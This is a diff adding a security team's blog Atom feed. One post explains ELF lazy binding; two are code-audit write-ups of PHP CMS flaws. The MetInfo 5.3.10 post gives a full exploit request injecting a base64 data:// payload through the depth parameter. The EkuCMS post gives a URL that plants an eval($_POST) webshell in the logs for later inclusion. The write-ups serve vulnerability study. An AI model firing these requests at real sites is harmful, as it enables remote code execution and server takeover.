@@ -1,0 +1,131 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+  <title>DROPS攻防训练营</title>
+  <subtitle>中原工学院（ZUT）攻防技术团队</subtitle>
+  <link href="/atom.xml" rel="self"/>
+  
+  <link href="http://blog.dropsec.xyz/"/>
+  <updated>2017-03-16T05:43:11.560Z</updated>
+  <id>http://blog.dropsec.xyz/</id>
+  
+  <author>
+    <name>DROPS</name>
+    
+  </author>
+  
+  <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>延迟绑定技术原理</title>
+    <link href="http://blog.dropsec.xyz/2017/02/24/%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/"/>
+    <id>http://blog.dropsec.xyz/2017/02/24/延迟绑定技术原理/</id>
+    <published>2017-02-24T05:32:45.000Z</published>
+    <updated>2017-03-16T05:43:11.560Z</updated>
+    
+    <content type="html"><![CDATA[<p>动态链接比静态链接灵活，但牺牲了性能，据统计ELF程序在静态链接下比动态库快大约1%~5%。<br>主要原因是，动态链接下对于全局和静态数据的访问都要进行复杂的GOT定位，然后间接寻址，对于模块间的调用也要先定位GOT，然后进行间接跳转。<br>另外，动态链接的链接过程是在运行时完成的，动态链接器会寻找并转载所需要的对象，然后进行符号查找地址重定位等工作。<br><a id="more"></a><br>延迟绑定的实现步骤如下：</p>
+<p>建立一个 GOT.PLT 表，该表用来放全局函数的实际地址，但最开始时，该里面放的不是真实的地址而是一个跳转，接下来会讲。<br>对每一个全局函数，链接器生成一个与之相对应的影子函数，如 fun@plt。<br>所有对 fun 的调用，都换成对 fun@plt 的调用，每个fun@plt 长成如下样子：<br><figure class="highlight crystal"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">fun</span>@<span class="title">plt</span></span>:</div><div class="line">jmp *(<span class="function"><span class="keyword">fun</span>@<span class="title">got</span></span>.plt)</div><div class="line">push index</div><div class="line">jmp _init</div></pre></td></tr></table></figure></p>
+<p>其中第一条指令直接从 got.plt 中去拿真实的函数地址，如果已经之前已经发生过调用，got.plt 就已经保存了真实的地址，如果是第一次调用，则 got.plt 中放的是 fun@plt 中的第二条指令，这就使得当执行第一次调用时，fun@plt中的第一条指令其实什么事也没做，直接继续往下执行，第二条指令的作用是把当前要调用的函数在 got.plt 中的编号作为参数传给 _init()，而 _init() 这个函数则用于把 fun 进行重定位，然后把结果写入到 got.plt 相应的地方，最后直接跳过去该函数。</p>
+<p>仍然是使用前面的例子，我们看看 g_func2 是怎样调用 g_func 的:<br><figure class="highlight llvm"><table><tr><td class="code"><pre><div class="line"><span class="number">0000052</span>f &lt;g_func<span class="number">2</span>&gt;:</div><div class="line"><span class="number">52</span>f:   <span class="number">55</span>                      push   <span class="symbol">%ebp</span></div><div class="line"><span class="number">530</span>:   <span class="number">89</span> e<span class="number">5</span>                   mov    <span class="symbol">%esp</span>,<span class="symbol">%ebp</span></div><div class="line"><span class="number">532</span>:   <span class="number">53</span>                      push   <span class="symbol">%ebx</span></div><div class="line"><span class="number">533</span>:   <span class="number">83</span> ec <span class="number">14</span>                <span class="keyword">sub</span>    $<span class="number">0x14</span>,<span class="symbol">%esp</span></div><div class="line"><span class="number">536</span>:   e<span class="number">8</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          <span class="keyword">call</span>   <span class="number">53</span>b &lt;g_func<span class="number">2</span>+<span class="number">0xc</span>&gt;</div><div class="line"><span class="number">53</span>b:   <span class="number">5</span>b                      pop    <span class="symbol">%ebx</span></div><div class="line"><span class="number">53</span><span class="keyword">c</span>:   <span class="number">81</span> <span class="keyword">c</span><span class="number">3</span> <span class="number">91</span> <span class="number">11</span> <span class="number">00</span> <span class="number">00</span>       <span class="keyword">add</span>    $<span class="number">0x1191</span>,<span class="symbol">%ebx</span></div><div class="line"><span class="number">542</span>:   <span class="keyword">c</span><span class="number">7</span> <span class="number">45</span> f<span class="number">8</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>    movl   $<span class="number">0x2</span>,<span class="number">0xfffffff8</span>(<span class="symbol">%ebp</span>) // a = <span class="number">2</span></div><div class="line"><span class="number">549</span>:   <span class="number">83</span> ec <span class="number">0</span><span class="keyword">c</span>                <span class="keyword">sub</span>    $<span class="number">0xc</span>,<span class="symbol">%esp</span></div><div class="line"><span class="number">54</span><span class="keyword">c</span>:   <span class="number">6</span>a <span class="number">03</span>                   push   $<span class="number">0x3</span> // push argument <span class="number">3</span> for g_func.</div><div class="line"><span class="number">54</span>e:   e<span class="number">8</span> d<span class="number">5</span> fe ff ff          <span class="keyword">call</span>   <span class="number">428</span> &lt;g_func<span class="title">@plt</span>&gt;</div><div class="line"><span class="number">553</span>:   <span class="number">83</span> <span class="keyword">c</span><span class="number">4</span> <span class="number">10</span>                <span class="keyword">add</span>    $<span class="number">0x10</span>,<span class="symbol">%esp</span></div><div class="line"><span class="number">556</span>:   <span class="number">89</span> <span class="number">45</span> f<span class="number">4</span>                mov    <span class="symbol">%eax</span>,<span class="number">0xfffffff4</span>(<span class="symbol">%ebp</span>)</div><div class="line"><span class="number">559</span>:   <span class="number">8</span>b <span class="number">45</span> f<span class="number">4</span>                mov    <span class="number">0xfffffff4</span>(<span class="symbol">%ebp</span>),<span class="symbol">%eax</span></div><div class="line"><span class="number">55</span><span class="keyword">c</span>:   <span class="number">03</span> <span class="number">45</span> f<span class="number">8</span>                <span class="keyword">add</span>    <span class="number">0xfffffff8</span>(<span class="symbol">%ebp</span>),<span class="symbol">%eax</span></div><div class="line"><span class="number">55</span>f:   <span class="number">8</span>b <span class="number">5</span>d fc                mov    <span class="number">0xfffffffc</span>(<span class="symbol">%ebp</span>),<span class="symbol">%ebx</span></div><div class="line"><span class="number">562</span>:   <span class="keyword">c</span><span class="number">9</span>                      leave  </div><div class="line"><span class="number">563</span>:   <span class="keyword">c</span><span class="number">3</span>                      <span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
+<p>如上汇编，指令 536, 53b, 53c, 用于计算 got.plt 的具体位置，计算方式与前面对数据的访问原理是一样的，经计算此时, %ebx = 0x53b + 0x1191 = 0x16cc, 注意指令 54e， 该指令调用了函数 g_func@plt:<br><figure class="highlight basic"><table><tr><td class="code"><pre><div class="line"><span class="symbol">00000428 </span>&lt;g_func@plt&gt;:</div><div class="line"><span class="number">428</span>:   ff a3 <span class="number">0</span>c <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       jmp    *<span class="number">0</span>xc(%ebx)</div><div class="line"><span class="number">42e</span>:   <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          push   $<span class="number">0</span>x0</div><div class="line"><span class="number">433</span>:   e9 e0 ff ff ff          jmp    <span class="number">418</span> &lt;_init+<span class="number">0</span>x18&gt;</div></pre></td></tr></table></figure></p>
+<p>注意到此时， %ebx 中放的是 got.plt 的地址，g_func@plt 的第一条指令用于获取 got.plt 中 func 的具体地址， func 放在 0xc + %ebx = 0xc + 0x16cc = 0x16d8, 这个地址里放的是什么呢？我们查一下重定位表：<br><figure class="highlight sqf"><table><tr><td class="code"><pre><div class="line">-bash-<span class="number">3.00</span>$ objdump -R liba.so</div><div class="line"></div><div class="line">liba.so:     file <span class="built_in">format</span> elf32-i386</div><div class="line"></div><div class="line">DYNAMIC RELOCATION RECORDS</div><div class="line">OFFSET   <span class="built_in">TYPE</span>              VALUE</div><div class="line"><span class="number">000016</span>e0 R_386_RELATIVE    *<span class="built_in">ABS</span>*</div><div class="line"><span class="number">000016</span>e4 R_386_RELATIVE    *<span class="built_in">ABS</span>*</div><div class="line"><span class="number">000016</span>bc R_386_GLOB_DAT    g_share</div><div class="line"><span class="number">000016</span>c0 R_386_GLOB_DAT    <span class="variable">__cxa_finalize</span></div><div class="line"><span class="number">000016</span>c4 R_386_GLOB_DAT    <span class="variable">_Jv_RegisterClasses</span></div><div class="line"><span class="number">000016</span>c8 R_386_GLOB_DAT    <span class="variable">__gmon_start__</span></div><div class="line"><span class="number">000016</span>d8 R_386_JUMP_SLOT   g_func</div><div class="line"><span class="number">000016</span>dc R_386_JUMP_SLOT   <span class="variable">__cxa_finalize</span></div></pre></td></tr></table></figure></p>
+<p>可见，该地址里放的就是 g_func 的具体地址，那此时 0x16d8 放的是真正的地址了吗？我们再看看 got.plt:<br><figure class="highlight clean"><table><tr><td class="code"><pre><div class="line">Contents <span class="keyword">of</span> section .got.plt:</div><div class="line"><span class="number">16</span>cc fc150000 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">2e040000</span>  ................</div><div class="line"><span class="number">16</span>dc <span class="number">3e040000</span></div></pre></td></tr></table></figure></p>
+<p>16d8 处的内容是: 2e040000, 小端序，换回整形就是 0x000042e, 该地址就是 fun@plt 的第二条指令！</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;动态链接比静态链接灵活，但牺牲了性能，据统计ELF程序在静态链接下比动态库快大约1%~5%。&lt;br&gt;主要原因是，动态链接下对于全局和静态数据的访问都要进行复杂的GOT定位，然后间接寻址，对于模块间的调用也要先定位GOT，然后进行间接跳转。&lt;br&gt;另外，动态链接的链接过程是在运行时完成的，动态链接器会寻找并转载所需要的对象，然后进行符号查找地址重定位等工作。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="System" scheme="http://blog.dropsec.xyz/tags/System/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Metinfo5.3.10 CMS 命令执行 文件包含</title>
+    <link href="http://blog.dropsec.xyz/2016/11/27/Metinfo5-3-10-CMS-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    <id>http://blog.dropsec.xyz/2016/11/27/Metinfo5-3-10-CMS-命令执行-文件包含/</id>
+    <published>2016-11-27T14:55:21.000Z</published>
+    <updated>2017-03-14T13:56:13.964Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x00-MetInfo"><a href="#0x00-MetInfo" class="headerlink" title="0x00 MetInfo"></a>0x00 MetInfo</h3><p>MetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。<br><a id="more"></a></p>
+<h3 id="0x01-命令执行-文件包含"><a href="#0x01-命令执行-文件包含" class="headerlink" title="0x01 命令执行 文件包含"></a>0x01 命令执行 文件包含</h3><p><strong>命令执行：</strong>应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、<br>passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令<br>拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。<br><!-- more --><br><strong>文件包含：</strong>由于程序员未对用户可控的变量进行输入检查，导致用户可以控制被包含的文件，成功利用时可以使web server会将特定文件当成php执行，从而导致用户可获取一定的服务器权限。</p>
+<p>此次产生漏洞的版本号为Metinfo5.3.10，源码大家可以下载。</p>
+<h3 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h3><p>文件admin/login/login_check.php：26行<br><figure class="highlight awk"><table><tr><td class="code"><pre><div class="line"> f(<span class="variable">$action</span>==<span class="string">"login"</span>)&#123;</div><div class="line">    <span class="variable">$metinfo_admin_name</span>     = <span class="variable">$login_name</span>;</div><div class="line">    <span class="variable">$metinfo_admin_pass</span>     = <span class="variable">$login_pass</span>;</div><div class="line">    <span class="variable">$metinfo_admin_pass</span>=md5(<span class="variable">$metinfo_admin_pass</span>);</div><div class="line">    <span class="regexp">/*code*/</span></div><div class="line">    <span class="keyword">if</span>(<span class="variable">$met_login_code</span>==<span class="number">1</span>)&#123;</div><div class="line">       require_once <span class="variable">$depth</span>.<span class="string">'../include/captcha.class.php'</span>;</div><div class="line">       <span class="variable">$Captcha</span>= new  Captcha();</div><div class="line">       <span class="keyword">if</span>(!<span class="variable">$Captcha</span>-&gt;CheckCode(<span class="variable">$code</span>))&#123;</div><div class="line">      echo(<span class="string">"&lt;script type='text/javascript'&gt;alert('$lang_logincodeerror');location.href='login.php?langset=$langset';&lt;/script&gt;"</span>);</div><div class="line">      <span class="keyword">exit</span>;</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>登录检测的，当后台开启登录校验码的时候$met_login_code会设置为1，然后require_once 去包含校验码登录文件。只要我们控制了变量$depth就可以进行远程文件包含了。</p>
+<p>而$depth变量是在文件’admin/login/login_check.php’开头定义的。<br><figure class="highlight lasso"><table><tr><td class="code"><pre><div class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE);</div><div class="line"><span class="keyword">if</span>($depth!=<span class="string">''</span>&amp;&amp;$depth!=<span class="string">'../'</span>&amp;&amp;$depth!=<span class="string">'../../'</span>)&#123;die();&#125;</div><div class="line"><span class="keyword">if</span>(!isset($depth))$depth=<span class="string">''</span>;</div><div class="line">$commonpath=$depth.<span class="string">'include/common.inc.php'</span>;</div><div class="line">$commonpath=$admin_index?$commonpath:<span class="string">'../'</span>.$commonpath;</div><div class="line"><span class="class"><span class="keyword">define</span></span>(<span class="string">'SQL_DETECT'</span>,<span class="number">1</span>);</div></pre></td></tr></table></figure></p>
+<p>通过第一次拼接$depth包含了include/common.inc.php，前面几步可能没什么问题，这一步也没有问题的，包含了文件common.inc.php之后，但是common.inc.php中可以通过以下代码进行变量覆盖。</p>
+<p>文件：include/common.inc.php：35<br><figure class="highlight php"><table><tr><td class="code"><pre><div class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_COOKIE'</span>, <span class="string">'_POST'</span>, <span class="string">'_GET'</span>) <span class="keyword">as</span> $_request) &#123;    <span class="comment">// 遍历数组</span></div><div class="line"></div><div class="line"><span class="comment">// $$_request分别是$_COOKIE, $_POST, $_GET，对应http请求提交过来的相应数据</span></div><div class="line"> <span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_key =&gt; $_value) &#123;           <span class="comment">// 分别遍历该数据</span></div><div class="line">  </div><div class="line">  $_key&#123;<span class="number">0</span>&#125; != <span class="string">'_'</span> &amp;&amp; $$_key = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);     <span class="comment">// 对数据中的值进行转义</span></div><div class="line">  $_M[<span class="string">'form'</span>][$_key] = daddslashes($_value,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>);</div><div class="line"> &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>对页面提交过来的数据，包括cookie，post, get三种数据进行转义。</p>
+<p>但是此处却存在一个变量覆盖漏洞，这里我们简单本地演示一下：<br><figure class="highlight xml"><table><tr><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?php</span></span></div><div class="line"></div><div class="line">$a=<span class="string">'hello'</span>;</div><div class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $key =&gt; $value)&#123;</div><div class="line">$$key = $value;</div><div class="line">&#125;</div><div class="line"><span class="keyword">print</span> $a;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><img src="http://i1.piimg.com/567571/d5b5e87512c79439.png" alt=""> </p>
+<p>当我们get提交一个a值时，它会覆盖掉以前所定义，产生变量覆盖<br><img src="http://i1.piimg.com/567571/4b634cadfa654e5f.png" alt=""></p>
+<h3 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h3><p>我们可以利用变量覆盖漏洞覆盖掉变量$deph。</p>
+<p>本地文件包含用require_once来执行代码，但是<br><figure class="highlight perl"><table><tr><td class="code"><pre><div class="line"><span class="keyword">if</span>($depth!=<span class="string">''</span>&amp;&amp;$depth!=<span class="string">'../'</span>&amp;&amp;$depth!=<span class="string">'../../'</span>)&#123;<span class="keyword">die</span>();&#125;</div></pre></td></tr></table></figure></p>
+<p>对depth进行了过滤，我们可以使用php的封装协议data://配合require_once来进行恶意代码执行。<br>还有一个问题<br><figure class="highlight nginx"><table><tr><td class="code"><pre><div class="line"><span class="attribute">require_once</span> <span class="variable">$depth</span>.<span class="string">'../include/captcha.class.php'</span>;</div></pre></td></tr></table></figure></p>
+<p>这一串拼接在字符后面的字符串的干扰，这一段会干扰我们想要执行的代码。</p>
+<p>用base64解码正常文字会让后面这一串字符变成乱码，并且加上了单行注释符号注释掉乱码。</p>
+<p>封装器解码之后代码的样子<br><figure class="highlight awk"><table><tr><td class="code"><pre><div class="line">&lt;?php phpinfo();<span class="keyword">exit</span>();<span class="regexp">//</span> ..þ)Üç^ýÆ©µÈZ.rV¬s.php</div></pre></td></tr></table></figure></p>
+<p>这样我们构造exp进行测试，前提后台开启了登录验证码：<br><figure class="highlight perl"><table><tr><td class="code"><pre><div class="line">POST /MetInfo_5.<span class="number">3.10</span>/admin/login/login_check.php?langset=cn&amp;depth=data:<span class="regexp">//text</span><span class="regexp">/plain;base64,PD9waHAgcGhwaW5mbygpO2V4aXQoKTsvLw== HTTP/</span><span class="number">1.1</span></div><div class="line">Host: <span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span></div><div class="line">Content-Length: <span class="number">83</span></div><div class="line">Cache-Control: max-age=<span class="number">0</span></div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">9</span>,image/webp,*<span class="regexp">/*;q=0.8</span></div><div class="line">Origin: http:/<span class="regexp">/127.0.0.1</span></div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">45.0</span>.<span class="number">2454.101</span> Safari/<span class="number">537.36</span></div><div class="line">Content-Type: application/<span class="keyword">x</span>-www-form-urlencoded</div><div class="line">Referer: http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>/MetInfo_5.<span class="number">3.10</span>/admin/login/login.php</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Accept-Language: zh-CN,zh;<span class="keyword">q</span>=<span class="number">0</span>.<span class="number">8</span></div><div class="line">Cookie: _ga=GA1.<span class="number">1.1522517218</span>.<span class="number">1476456267</span>; tablepage_json=<span class="number">0</span>%7Csystem%2Cnews%2Cdonews_info; ft127001=<span class="number">0</span>; recordurl=%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252F%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252Findex.php%253Flang%253Dcn%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252F%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252F%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252F%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252F%2Chttp%253A%252F%252F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%252FMetInfo_5.<span class="number">3.10</span>%252Findex.php%253Flang%253Dcn; re_url=http%3A%2F%2F127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%2FMetInfo_5.<span class="number">3.10</span>%2Fadmin%2F; met_capcha=<span class="number">1</span>f1ezzrSrlMNL9bl5TC1%2F2CBMinv2dvD8CX74vlrMRbq</div><div class="line">Connection: <span class="keyword">close</span></div><div class="line"></div><div class="line">action=login&amp;login_name=admin&amp;login_pass=<span class="number">123456</span>&amp;code=<span class="number">8</span>CAA&amp;Submit=%E7%99%BB%E5%BD%95</div></pre></td></tr></table></figure></p>
+<p>执行了phpinfo()<br><img src="http://p1.bpimg.com/567571/029868dcb218554d.png" alt=""></p>
+<p>因为使用了data://，所以需要php.ini 中allow_url_include ＝on</p>
+<h3 id="0x04、漏洞修复"><a href="#0x04、漏洞修复" class="headerlink" title="0x04、漏洞修复"></a>0x04、漏洞修复</h3><p>包含include/common.inc.php再次给$depth赋值，防止变量被污染</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x00-MetInfo&quot;&gt;&lt;a href=&quot;#0x00-MetInfo&quot; class=&quot;headerlink&quot; title=&quot;0x00 MetInfo&quot;&gt;&lt;/a&gt;0x00 MetInfo&lt;/h3&gt;&lt;p&gt;MetInfo采用PHP+Mysql架构,是一款对SEO非常友好、功能全面、安全稳定、支持多终端展示并且使用起来极其简单的企业建站系统。&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="php" scheme="http://blog.dropsec.xyz/tags/php/"/>
+    
+      <category term="代码审计" scheme="http://blog.dropsec.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>易酷CMS文件包含</title>
+    <link href="http://blog.dropsec.xyz/2016/11/20/%E6%98%93%E9%85%B7CMS%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    <id>http://blog.dropsec.xyz/2016/11/20/易酷CMS文件包含/</id>
+    <published>2016-11-20T08:23:48.000Z</published>
+    <updated>2017-03-15T00:17:02.787Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="0x01-先说说文件包含的关键函数"><a href="#0x01-先说说文件包含的关键函数" class="headerlink" title="0x01 先说说文件包含的关键函数"></a>0x01 先说说文件包含的关键函数</h4><p>php文件包含函数include、include_once、require、require_once 区别</p>
+<p>1、在错误的处理上</p>
+<p>require()语句在遇到包含文件不存在，或是出错的时候，就停止即行，并报错。include()则继续即行。</p>
+<p>ps：在PHP4.3.5之前不会报错<br><a id="more"></a><br>如果你想在出错的地方就停止程序，那么你就选择require吧。include()就不是这样，程序还是会运行，同时要保证包含路径是正确的。</p>
+<p>2、include（）<br>include()语句将在其被调用的位置处包含一个文件。包含后运行包含的文件。</p>
+<p>3、include_once()<br>include_once()在执行包含文件并运行文件，这和include（）类似，唯一不同的是include_once()会判断是否已经执行过，如果已经包含，则忽略这次包含。</p>
+<p>4、require()<br>require()在很大的程度上和include()相同，有两个重要的区别。首先无论执行的语句如何，只要出现了require(filename)，就会包含这个文件，即使语句是false。其次看上文中的1。</p>
+<p>5、require_once()<br>require_once()在很大程度上和require()相同。唯一的区别就是require_once()会判断包含的文件是不是已经被执行过，避免函数的重定义和变量重新赋值。</p>
+<h4 id="0x02-代码分析："><a href="#0x02-代码分析：" class="headerlink" title="0x02 代码分析："></a>0x02 代码分析：</h4><p>路径：/core/Lib/Action/Home/MyAction.class.php</p>
+<p>1、$id变量来自于GET传入，之后又传到了display函数，display函数的参数是模板的名称。</p>
+<p><img src="http://obh16g4rw.bkt.clouddn.com/46.png" alt=""><br>2、跟踪display函数，传值到模板处理函数fetch()   view.class.php(163-210）<br><img src="http://obh16g4rw.bkt.clouddn.com/47.png" alt=""> </p>
+<p>调用非默认模板，模板阵列分量分解直接载入模板，没有做过滤处理，直接include<br>3、对包含文件的处理 /core/ThinkPHP/Lib/Think/Core/View.class.php (374-391)<br><img src="http://obh16g4rw.bkt.clouddn.com/48.png" alt=""></p>
+<p>直接引入其他模板的操作，无任何过滤</p>
+<h4 id="0x03-漏洞利用"><a href="#0x03-漏洞利用" class="headerlink" title="0x03 漏洞利用"></a>0x03 漏洞利用</h4><p>1、通过以上函数的跟踪，发现包含点，构造一句话，利用thinphp日志记录，写入一句话</p>
+<p>exp：<a href="http://localhost/ekucms2.4.1/index.php?s=my/show/id/{~eval($_POST[LED])}" target="_blank" rel="external">http://localhost/ekucms2.4.1/index.php?s=my/show/id/{~eval($_POST[LED])}</a><br><img src="http://obh16g4rw.bkt.clouddn.com/49.png" alt=""><br><img src="http://obh16g4rw.bkt.clouddn.com/50.png" alt=""></p>
+<p>2、包含一句话（利用日志文件）<br> <img src="http://obh16g4rw.bkt.clouddn.com/51.png" alt=""><br>3、菜刀连接<br><img src="http://obh16g4rw.bkt.clouddn.com/52.png" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;0x01-先说说文件包含的关键函数&quot;&gt;&lt;a href=&quot;#0x01-先说说文件包含的关键函数&quot; class=&quot;headerlink&quot; title=&quot;0x01 先说说文件包含的关键函数&quot;&gt;&lt;/a&gt;0x01 先说说文件包含的关键函数&lt;/h4&gt;&lt;p&gt;php文件包含函数include、include_once、require、require_once 区别&lt;/p&gt;
+&lt;p&gt;1、在错误的处理上&lt;/p&gt;
+&lt;p&gt;require()语句在遇到包含文件不存在，或是出错的时候，就停止即行，并报错。include()则继续即行。&lt;/p&gt;
+&lt;p&gt;ps：在PHP4.3.5之前不会报错&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="web安全" scheme="http://blog.dropsec.xyz/tags/web%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="文件包含" scheme="http://blog.dropsec.xyz/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
+    
+  </entry>
+  
+</feed>
